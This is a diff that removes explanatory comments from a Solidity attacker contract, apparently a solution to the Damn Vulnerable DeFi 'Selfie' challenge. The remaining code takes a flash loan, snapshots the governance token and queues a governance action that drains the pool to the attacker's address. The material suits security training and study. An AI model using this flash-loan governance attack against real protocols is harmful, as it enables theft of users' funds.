@@ -9,7 +9,6 @@
 ```
 pragma solidity ^0.6.0;
 
-// Simple Governance, Selfie Pool and DamnValuable Token Snapshot interfaces
 interface ISimpleGovernance {
     function queueAction(
         address receiver,
@@ -50,23 +49,20 @@ contract SelfieAttacker {
         pool.flashLoan(flashLoanBalance);
     }
 
-    // called by ISelfiePool::flashLoan
+
     function receiveTokens(address, uint256 amount) external {
-        // received tokens => take a snapshot because it's checked in queueAction
+
         token.snapshot();
 
-        // we can now queue a government action to drain all funds to attacker account
-        // because it checks the balance of governance tokens (which is the same token as the pool token)
+
         bytes memory drainAllFundsPayload =
             abi.encodeWithSignature("drainAllFunds(address)", attackerEOA);
-        // store actionId so we can later execute it
         actionId = governance.queueAction(
             address(pool),
             drainAllFundsPayload,
             0
         );
 
-        // pay back to flash loan sender
         token.transfer(address(pool), amount);
     }
 }
